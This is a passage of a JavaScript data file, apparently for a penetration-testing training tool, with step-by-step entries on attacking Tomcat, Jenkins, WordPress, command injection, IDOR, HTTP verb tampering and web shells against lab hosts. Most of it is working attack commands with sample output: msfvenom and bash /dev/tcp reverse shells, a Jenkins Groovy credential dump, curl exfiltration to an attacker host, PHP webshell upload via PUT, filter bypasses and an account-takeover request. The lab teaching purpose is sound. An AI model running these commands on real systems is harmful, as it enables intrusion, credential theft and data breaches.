        { where: 'local', tool: 'msfvenom', cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o rev.war', output: [
          'Payload size: 1098 bytes',
          'Final size of war file: 1098 bytes',
          'Saved as: rev.war',
        ].join('\n') },
        { where: 'local', tool: 'curl', cmd: "curl -u 'tomcat:s3cret' 'http://10.10.10.10:8080/manager/text/deploy?path=/shell' --upload-file rev.war", output: 'OK - Deployed application at context path [/shell]' },
      ],
    },
    'jenkins-access': {
      how: {"lead":"Jenkins runs Groovy and build steps as a privileged user, so access is usually RCE. Find the execution surface, then run a command, a shell, or dump the stored credentials:","items":[{"t":"Run Groovy in the Script Console","d":"If you reach /script (as admin, sometimes anonymously), the Groovy console executes on the controller, and Groovy's execute() runs OS commands.","demo":[{"run":"curl -s \"http://<target>:8080/scriptText\" --data-urlencode 'script=\"id\".execute().text'","out":"uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)","sig":"uid=1000(jenkins)"}],"note":"/scriptText runs Groovy and returns output; you execute as the jenkins user."},{"t":"Reverse shell from Groovy","d":"The same console builds a reverse shell in a few lines; a base64-wrapped bash one-liner dodges quoting. Start your listener first.","demo":[{"run":"curl -s \"http://<target>:8080/scriptText\" --data-urlencode 'script=\"bash -c {echo,YmFzaCAtaSA+Ji4uLg==}|{base64,-d}|bash\".execute()'","out":"(on your listener)  jenkins@ci:/var/lib/jenkins$","sig":"jenkins@ci"}],"note":"The base64 bash one-liner lands an interactive shell as jenkins."},{"t":"Abuse a freestyle build step","d":"No script console? A job's 'Execute shell' build step runs commands by design. Create or edit a job, add a shell step, and build it.","demo":[{"run":"curl -s -X POST \"http://<target>:8080/job/test/build\" --user admin:admin","out":"(build log)  + id\nuid=1000(jenkins) gid=1000(jenkins)","sig":"uid=1000(jenkins)"}],"note":"The build step is intended RCE; the console output carries your command's result."},{"t":"Dump stored credentials","d":"Jenkins stores SSH keys, cloud tokens, and service passwords encrypted with a master key on the same box, so from the console you can decrypt them all.","demo":[{"run":"curl -s \"http://<target>:8080/scriptText\" --data-urlencode 'script=com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials).each{println it.username+\":\"+it.password}'","out":"deploy:D3pl0yK3y!\nsvc_backup:Backup123","sig":"deploy:D3pl0yK3y!"}],"note":"Recovered credentials often unlock other hosts: Jenkins is a credential goldmine."}]},
      leadup: [{"key":"portscan","label":"A CI server on 8080","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n8080/tcp open  http    Jetty 9.4.z (Jenkins 2.222.1)","sig":"8080/tcp open  http    Jetty 9.4.z (Jenkins 2.222.1)","teach":"The interesting service is not the plain web server but what is listening alongside it."},{"title":"Confirm Jenkins","tool":"curl","where":"local","cmd":"curl -s -i http://<target>:8080/login | grep -iE \"jenkins|x-jenkins\"","out":"X-Jenkins: 2.222.1\n<title>Sign in [Jenkins]</title>","sig":"X-Jenkins: 2.222.1","teach":"The X-Jenkins header names the version; the Script Console behind that login runs Groovy, which is direct code execution."}]},{"key":"pathproxy","label":"Behind a /jenkins path","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Probe a common path","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/jenkins/ | grep -i x-jenkins","out":"X-Jenkins: 2.222.1","sig":"X-Jenkins: 2.222.1","teach":"Jenkins is often reverse-proxied under /jenkins on port 80, so probe that path even when 8080 is filtered from outside."}]}],
      why: "Jenkins is a build server, so running code is its whole job, which means any near-admin access is a shell: the Groovy Script Console runs as the Jenkins user, and so does a build step. Even unauthenticated instances leak secrets and job configs. Reach for it whenever 8080 shows Jenkins; check for no-auth access first, then the Script Console. On Windows build nodes this is frequently your foothold onto the domain.",
      cmd: "curl -s http://10.10.10.10:8080/script --data-urlencode 'script=println \"id\".execute().text'", tool: 'curl',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service, often root or a privileged build account. If /script is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run privileged.',
    },
    'wordpress': {
      how: {"lead":"WordPress is attacked through its users, plugins, and themes. Enumerate, get a credential or a vulnerable plugin, then reach code execution through the admin:","items":[{"t":"Enumerate users and plugins","d":"wpscan maps the version, the user logins, and installed plugins with versions, which you match against known CVEs.","demo":[{"run":"wpscan --url http://<target> --enumerate u,vp","out":"[+] admin (Administrator)\n[+] WP Plugin: duplicator 1.3.26 (CVE-2020-11738, arbitrary file read)","sig":"CVE-2020-11738"}],"note":"A known-vulnerable plugin is the fastest path; the user list feeds a brute-force."},{"t":"Brute-force a login","d":"With a user list, wpscan hammers xmlrpc or wp-login. Weak admin passwords are common on lab boxes.","demo":[{"run":"wpscan --url http://<target> --usernames admin --passwords /usr/share/wordlists/rockyou.txt","out":"[SUCCESS] - admin / Password123","sig":"[SUCCESS] - admin"}],"note":"admin:Password123 gets the dashboard, where theme editing is RCE."},{"t":"RCE through the theme editor","d":"As admin, Appearance > Theme Editor writes PHP into a theme file (404.php); requesting that page runs it.","demo":[{"run":"curl -s \"http://<target>/wp-content/themes/twentytwentyone/404.php?0=id\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"You edited 404.php to run $_GET[0] in the dashboard; requesting it executes commands."},{"t":"Exploit a vulnerable plugin","d":"Where a plugin CVE exists it is often cleaner than the editor: arbitrary upload, file read, or unauthenticated RCE straight to a shell.","demo":[{"run":"curl -s \"http://<target>/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../wp-config.php\"","out":"define('DB_USER', 'wpadmin');\ndefine('DB_PASSWORD', 'Sup3rDB!2024');","sig":"DB_PASSWORD"}],"note":"The duplicator CVE from step 1 reads wp-config.php unauthenticated, handing you the database credentials with no login at all."}]},
      leadup: [{"key":"whatweb","label":"A fingerprint","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint the app","tool":"whatweb","where":"local","cmd":"whatweb http://<target>","out":"http://<target> [200 OK] WordPress[6.4.2], MetaGenerator[WordPress 6.4.2], PHP[8.1]","sig":"WordPress[6.4.2]","teach":"A WordPress version is a map: enumerate users and plugins, then match the versions against known-vulnerable plugin CVEs."}]},{"key":"loginpage","label":"The login page","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find wp-login","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/wp-login.php","out":"200","sig":"200","teach":"A live /wp-login.php confirms WordPress and gives you the user-enumeration and brute-force surface wpscan drives."}]}],
      why: "WordPress core is usually solid; its plugins and themes are not, so the game is enumeration, list the plugins, themes, users and versions with wpscan, then match a version to a known CVE. With admin credentials you skip straight to code execution by editing a theme file or uploading a plugin zip. Reach for it the instant you fingerprint WordPress, and map the third-party plugins first, because the vulnerable plugin is almost always the way in.",
      cmd: 'wpscan --url http://10.10.10.10 --enumerate u,vp --api-token $WPSCAN_API', tool: 'wpscan',
      output: [
        '[+] URL: http://10.10.10.10/  [10.10.10.10]',
        '[+] WordPress version 5.8.1 identified',
        '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
        '[i] User(s) Identified: admin, editor',
      ].join('\n'),
      signal: '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
      teach: 'wpscan maps a WordPress site: core version, plugins, and users. Plugins are where WordPress boxes fall, a vulnerable one like wp-file-manager is often a direct RCE. The enumerated users feed a login brute if you need one.',
    },
    'nikto-scan': {
      how: {"lead":"Nikto is a fast first pass that flags the obvious: dangerous files, default content, dated servers, and known misconfigurations. Run it early, then chase each flag by hand:","items":[{"t":"Run the baseline scan","d":"Point nikto at the host and read the plus-prefixed findings. It is noisy and not stealthy, so run it in labs, not where detection matters.","demo":[{"run":"nikto -h http://<target>","out":"+ Server: Apache/2.4.41\n+ /admin/: Admin login page found\n+ /.git/config: Git config found\n+ /icons/README: Apache default file","sig":"/.git/config: Git config found"}],"note":"Each + is a lead, not a finding: the .git and /admin hits are the ones to act on."},{"t":"Tune it for the target","d":"Add -ssl for HTTPS, -p for a non-standard port, and -Tuning to focus a category and cut the noise.","demo":[{"run":"nikto -h https://<target> -p 8443 -Tuning 9","out":"+ /cgi-bin/: Potentially interesting directory\n+ /cgi-bin/test.cgi: Shellshock candidate","sig":"Shellshock candidate"}],"note":"Tuning 9 focuses on known exploits; a cgi-bin hit raises Shellshock as a lead."},{"t":"Cross-check and verify","d":"Nikto has false positives, so confirm each flag by hand before you act. A reported file might 404 on a real request, or a 'vulnerable' banner might be patched.","demo":[{"run":"curl -s -o /dev/null -w \"%{http_code}\\n\" http://<target>/.git/config","out":"200","sig":"200"}],"note":"A real 200 on the flagged path confirms it: now it is a lead worth working."},{"t":"Feed findings into the next move","d":"Nikto is a router, not a destination: a .git flag goes to the git-exposure move, a cgi-bin hit to command injection, a dated CMS to its own attack surface.","demo":[{"run":"git-dumper http://<target>/.git/ ./src","out":"[+] Fetching .git/config\n[+] Fetching index\n[+] Recovered 48 files to ./src","sig":"Recovered 48 files"}],"note":"The .git flag becomes the Exposed .git move: git-dumper reconstructs the source nikto only pointed at. Each other flag routes the same way."}]},
      leadup: [{"key":"scan","label":"From the port scan","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."}]}],
      why: "Nikto is a shotgun: it checks thousands of known-bad files, stale server versions, and default apps that targeted content discovery can miss. The tradeoff is that it is slow and very loud, so fire it early and let it run in the background while you work the app by hand, not as something you sit and wait on. Read its output as leads to verify, not as findings, it false-positives, and a noisy scan never replaces looking at the site yourself.",
      cmd: 'nikto -h http://10.10.10.10 -o scans/nikto.txt', tool: 'nikto',
      output: [
        '+ Server: Apache/2.4.49 (Unix)',
        '+ /admin/: This might be interesting.',
        '+ OSVDB-3233: /icons/README: Apache default file found.',
        '+ /cgi-bin/: Directory indexing found.',
      ].join('\n'),
      signal: '+ /admin/: This might be interesting.',
      teach: 'Nikto is a fast first pass that flags the obvious, default files, an exposed /admin, a dated banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
    },
    'command-injection': {
      leadup: [{"key":"tool","label":"A diagnostic tool","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a feature that shells out","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'ping|nslookup|traceroute|convert'","out":"<form action=\"/tools/ping.php\" method=\"get\"><input name=\"host\"></form>","sig":"action=\"/tools/ping.php\"","teach":"A ping, lookup, or convert feature almost always shells out, so its parameter is a command-injection candidate."}]},{"key":"cgi","label":"A cgi-bin script","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /cgi-bin/status.sh\n200      GET  /admin/exec.php","sig":"200      GET  /cgi-bin/status.sh","teach":"cgi-bin scripts and exec/cmd endpoints run OS commands directly, so they are the first place to test for injection."}]}],
      how: {"lead":"A parameter that reaches a shell runs whatever you append. Confirm it truly executes, learn the separator and the context, then trade one command for a shell. Work left to right:","items":[{"t":"Confirm with a separator","d":"Chain your command onto the intended one: ; runs yours next, | pipes into it, && runs yours only if the first succeeds, and a newline often works too. Start with something whose output you can see, like id.","demo":[{"run":"curl -s \"http://<target>/ping?host=127.0.0.1;id\"","out":"PING 127.0.0.1 (127.0.0.1): 56 data bytes\nuid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)"}],"note":"The id output after the ping proves your command ran in the same shell."},{"t":"When nothing comes back, go blind","d":"If the output is not reflected, prove execution another way. A time delay is the most reliable tell: inject sleep and watch the response stall.","demo":[{"run":"curl -s -o /dev/null -w \"%{time_total}\\n\" \"http://<target>/ping?host=127.0.0.1;sleep 5\"","out":"5.03","sig":"5.03"}],"note":"Five seconds where a ping is instant proves blind command injection."},{"t":"Exfiltrate blind output","d":"Blind but you need the result? Make the target send it to you: pipe the output into a curl back to your box, or into a DNS lookup of a subdomain you control.","demo":[{"run":"curl -G \"http://<target>/ping\" --data-urlencode \"host=;curl http://<lhost>/$(whoami)\"","out":"(on your box)  <target> - - \"GET /www-data HTTP/1.1\" 404","sig":"GET /www-data"}],"note":"The path of the request back to you carries the command's output."},{"t":"Beat input filters","d":"Spaces blocked? Use ${IFS}. Keywords blocked? Break them with quotes (w'h'oami) or wildcards (/bin/c?t). Slashes blocked? Reach for ${HOME} or base64-decode a payload.","demo":[{"run":"curl -G \"http://<target>/ping\" --data-urlencode \"host=127.0.0.1;cat${IFS}/etc/passwd\"","out":"root:x:0:0:root:/root:/bin/bash","sig":"root:x:0:0"}],"note":"${IFS} is the shell's field separator, a space the filter never sees."},{"t":"Upgrade to a reverse shell","d":"Once one command runs, trade the one-request webshell for an interactive shell. Start a listener on your box, then fire a bash /dev/tcp one-liner URL-encoded.","demo":[{"run":"curl -G \"http://<target>/ping\" --data-urlencode \"host=;bash -i >& /dev/tcp/<lhost>/4444 0>&1\"","out":"(on your listener)  connect to [<lhost>] from <target>\nwww-data@web:/var/www$","sig":"www-data@web"}],"note":"A prompt on your listener means a real interactive shell, not one command at a time."}]},
      why: "Command injection is the most direct road to RCE there is: no memory corruption, no exploit to port, just the server running whatever you append. That reliability is why any feature that plausibly shells out (a ping tool, a converter, a report generator) earns a quick probe ahead of slower avenues. The discipline that separates a clean win from a wrecked box is confirming the context with a harmless probe first, above all for the blind variants where nothing comes back, so you are not firing a shell payload into a sink you do not understand.",
      cmd: "curl -s 'http://10.10.10.10/ping.php?ip=127.0.0.1;id'", tool: 'curl',
      output: [
        'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
        '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'The app ran your ;id alongside its ping, the uid=www-data line is the web server executing your command. That is command injection, and it is a direct path to a reverse shell as the web user.',
    },
    'idor': {
      how: {"lead":"IDOR asks one question: does the server check who is asking, or only what they ask for. Make two accounts, then try to reach what is not yours, by number, by reference, and at scale:","items":[{"t":"Change the number","d":"The simplest IDOR: decrement or increment an id and see if you get someone else's record, while authenticated as a low-privilege user you control.","demo":[{"run":"curl -s -b session=userB \"http://<target>/account?id=1001\"","out":"{\"id\":1001,\"name\":\"Alice\",\"email\":\"alice@corp.local\"}","sig":"\"name\":\"Alice\""}],"note":"You are logged in as user B but just read user A's record: that is IDOR."},{"t":"Compare two accounts","d":"When ids are not sequential, make two accounts and diff what each can reach. If B can load A's object by its id, the server never checks ownership.","demo":[{"run":"curl -s -b session=userB \"http://<target>/api/invoice/A-7731\"","out":"{\"invoice\":\"A-7731\",\"owner\":\"alice\",\"amount\":4200}","sig":"\"owner\":\"alice\""}],"note":"The object says owner alice, but user B fetched it: ownership is never verified."},{"t":"Decode obfuscated references","d":"ids hidden as base64, hex, or a hash are not access control. Decode the reference, change it, re-encode, and send it back.","demo":[{"run":"curl -s -b session=userB \"http://<target>/doc?ref=$(echo -n 1002 | base64)\"","out":"{\"ref\":\"1002\",\"title\":\"Alice salary review\",\"visibility\":\"private\"}","sig":"\"visibility\":\"private\""}],"note":"Base64 is encoding, not a lock: decode, edit, re-encode, and the private doc opens."},{"t":"Flip the method or add a parameter","d":"Sometimes GET is checked but POST/PUT is not, or adding a second user_id returns someone else's data. Test the write side, not just reads.","demo":[{"run":"curl -s -X POST -b session=userB \"http://<target>/api/account/1001\" -d \"email=attacker@evil.com\"","out":"{\"status\":\"updated\",\"id\":1001,\"email\":\"attacker@evil.com\"}","sig":"\"status\":\"updated\""}],"note":"You just changed user A's email: a write-side IDOR, which is account takeover."},{"t":"Enumerate at scale","d":"One IDOR is a finding; looping it is a breach. Script the id range and collect every record to show the real impact.","demo":[{"run":"for i in $(seq 1000 1002); do curl -s -b session=userB \"http://<target>/account?id=$i\"; done","out":"{\"id\":1000,\"email\":\"root@corp.local\"}{\"id\":1001,\"email\":\"alice@corp.local\"}{\"id\":1002,\"email\":\"bob@corp.local\"}","sig":"\"email\":\"alice@corp.local\""}],"note":"A short loop dumps every user: this is how one IDOR becomes a data breach."}]},
      leadup: [{"key":"numeric","label":"A numeric id in the URL","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Notice the object id","tool":"curl","where":"local","cmd":"curl -s -b session=mine http://<target>/account?id=1001","out":"{\"id\":1001,\"name\":\"you\",\"email\":\"you@corp.local\",\"plan\":\"pro\"}","sig":"\"id\":1001","teach":"A resource addressed by a sequential id is begging to be swapped for someone else's number."}]},{"key":"api","label":"A REST API path","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Map the API","tool":"curl","where":"local","cmd":"curl -s -b session=mine http://<target>/api/users/5","out":"{\"id\":5,\"email\":\"you@corp.local\",\"role\":\"user\"}","sig":"you@corp.local","teach":"REST paths like /api/users/<id> are IDOR-prone: request a neighbour's id while logged in as yourself and see if it answers."}]}],
      why: "IDOR is the best reward-to-effort bug on the web: no payload, no tooling, just changing a number while logged in as someone else, and it routinely exposes other users' data or whole admin functions. That is why it is worth checking on every object reference instead of saving for later. Carry the mindset that access control is a question the server must answer on every request, and the place it is most often forgotten is the second, third, and hundredth object, which is how one IDOR enumerates into a breach.",
      cmd: "curl -s 'http://10.10.10.10/account?id=1002' -H 'Cookie: session=<yours>'", tool: 'curl',
      output: [
        '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
        ' "role":"customer","card_last4":"4417","balance":"42.10"}',
      ].join('\n'),
      signal: '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
      teach: 'You changed id=1001 (yours) to id=1002 and got someone else\'s record, an Insecure Direct Object Reference. The app checks that you are logged in, but not that the object is yours. Walk the IDs to harvest other users\' data.',
    },
    'verb-tampering': {
      how: {"lead":"A 403 that only guards one HTTP method is no guard at all. Swap the verb, confirm the bypass, and where WebDAV is on, write a shell:","items":[{"t":"Swap GET for another verb","d":"If GET /admin/ is 403, try POST, HEAD, PUT, or even a made-up method. Many access rules are written for GET only.","demo":[{"run":"curl -s -o /dev/null -w \"%{http_code}\\n\" -X POST http://<target>/admin/","out":"200","sig":"200"}],"note":"POST returned 200 where GET was 403: the rule only covered GET."},{"t":"Use HEAD to confirm reachability","d":"HEAD returns headers without a body and is frequently unguarded. A 200 on HEAD where GET is 403 confirms the control is verb-specific.","demo":[{"run":"curl -s -I http://<target>/admin/config | head -1","out":"HTTP/1.1 200 OK","sig":"200 OK"}],"note":"A 200 on HEAD proves the resource exists and the block is only on GET."},{"t":"Write a shell with PUT","d":"Where WebDAV or a misconfigured server allows PUT, upload a webshell directly, then request it. Confirm PUT via OPTIONS first.","demo":[{"run":"curl -s -X PUT http://<target>/shell.php --data '<?php system($_GET[0]); ?>' && curl -s \"http://<target>/shell.php?0=id\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"PUT wrote the file and a GET ran it: verb tampering straight to RCE."},{"t":"Break an auth gate with a bad method","d":"Some frameworks fail open on an unknown method, skipping auth middleware, so a nonsense verb can slip past a login check entirely.","demo":[{"run":"curl -s -X FOO http://<target>/admin/users","out":"{\"users\":[\"admin\",\"alice\",\"bob\"]}","sig":"\"users\""}],"note":"An unrecognised method bypassed the auth filter and returned protected data."}]},
      leadup: [{"key":"forbidden","label":"A 403 to bypass","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Hit a protected path","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/admin/","out":"403","sig":"403","teach":"A 403 that only guards GET is the opening: the access rule may ignore other verbs, so POST, HEAD, or an arbitrary method can slip past it."}]},{"key":"options","label":"An OPTIONS probe","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Ask which methods are allowed","tool":"curl","where":"local","cmd":"curl -s -i -X OPTIONS http://<target>/admin/ | grep -i allow","out":"Allow: GET, POST, PUT, HEAD, OPTIONS","sig":"Allow: GET, POST, PUT, HEAD, OPTIONS","teach":"An Allow header advertising PUT on a protected path is an invitation: the access rule may only cover GET."}]}],
      why: "Access rules are frequently written for GET and POST only, so hitting the same protected URL with HEAD, PUT, OPTIONS, or PATCH can walk straight past the check. OPTIONS also tells you which verbs the server allows, and a permitted PUT can let you upload a shell outright. Reach for it when a path is forbidden (401/403) but looks important; it is a thirty-second test that now and then hands you the whole thing.",
      cmd: 'curl -s -X OPTIONS -i http://10.10.10.10/admin/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, POST, PUT, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, POST, PUT, OPTIONS',
      teach: 'OPTIONS tells you which verbs the server accepts. PUT in the list on /admin/ is a red flag, you may be able to upload a web shell with a PUT, no injection needed. Enumerate methods before assuming a path is locked down.',
    },
    'web-shells': {
      how: {"lead":"A web shell is one command per request, clunky and loud. Know the languages, then upgrade it to a real interactive shell as fast as you can:","items":[{"t":"Pick the shell for the stack","d":"Match the language to the server: PHP for Apache/Nginx, JSP for Tomcat, ASPX for IIS, or a Laudanum/weevely shell. The right one runs; the wrong one just downloads.","demo":[{"run":"curl -s \"http://<target>/uploads/shell.php?c=whoami\"","out":"www-data","sig":"www-data"}],"note":"A one-liner PHP shell confirms execution; now make it interactive before you lose it."},{"t":"Catch a reverse shell","d":"Start a listener, then have the webshell call back with a bash /dev/tcp one-liner. An interactive shell beats one-request-per-command for everything that follows.","demo":[{"run":"curl -s -G \"http://<target>/uploads/shell.php\" --data-urlencode \"c=bash -i >& /dev/tcp/<lhost>/4444 0>&1\"","out":"(on your listener)  connect to [<lhost>] from <target>\nwww-data@web:/var/www/uploads$","sig":"www-data@web"}],"note":"The prompt on your listener is a real shell; the webshell was just the delivery."},{"t":"Stabilise the shell (get a PTY)","d":"A raw reverse shell has no job control or tab-complete. Upgrade with python pty.spawn, then background it and fix the terminal with stty so Ctrl-C and arrows work.","demo":[{"run":"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'","out":"www-data@web:/var/www$ (then Ctrl-Z; stty raw -echo; fg  gives tab-complete)","sig":"tab-complete"}],"note":"A PTY makes the shell usable: you can run sudo, su, and editors without it dying."},{"t":"Serve the shell when upload is blocked","d":"Cannot upload? Pull the shell over with the server's own tools: host it on your box with python -m http.server, then wget/curl it from a command-injection or LFI foothold.","demo":[{"run":"curl -s -G \"http://<target>/tools/ping\" --data-urlencode \"host=;wget http://<lhost>/shell.php -O /var/www/html/s.php\"","out":"(served from your box)  \"GET /shell.php HTTP/1.1\" 200","sig":"GET /shell.php"}],"note":"The target fetched the shell from you, landing it in the web root to request next."}]},
      leadup: [{"key":"fromupload","label":"From a file upload","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /index.html\n200      GET  /product.php\n200      GET  /upload.php","sig":"200      GET  /product.php","teach":"Content discovery maps the real pages; each dynamic one (product.php, upload.php) is a surface to attack in turn."},{"title":"Land a webshell","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/uploads/shell.php?c=id\"","out":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)","teach":"The upload executes, so you already have command execution; the job now is upgrading this one-shot webshell to an interactive reverse shell."}]},{"key":"fromrce","label":"From another RCE","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Already have command exec","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/tools/ping.php?host=;id\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)","teach":"Command injection or a SQLi INTO OUTFILE already gave you execution; a web shell makes that foothold persistent and easier to drive."}]}],
      why: "Once you can write a file into the webroot, through an upload, LFI-to-log, a SQL OUTFILE, or a PUT, you still need a shell file that matches the server's language, and Kali ships vetted ones (Laudanum, the webshells collection). This step is about picking the right payload for the stack, php versus aspx versus jsp, so your write actually executes. Reach for it the moment you hold a write primitive, and prefer a minimal webshell: you only need enough to catch a proper reverse shell.",
      cmd: "curl -s 'http://10.10.10.10/uploads/cmd.php?c=id'", tool: 'curl',
      output: [
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'Once your uploaded web shell runs commands (?c=id returns www-data), you have code execution, but one command per request is clumsy. The very next move is to turn it into a proper interactive reverse shell.',
    },
    'xss-basics': {
